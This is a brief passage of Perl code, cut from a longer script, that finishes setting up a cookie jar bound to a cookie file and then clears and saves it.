    		file => $cookie_file,
	);
	$cookie_jar->clear;
	$cookie_jar->save;
}

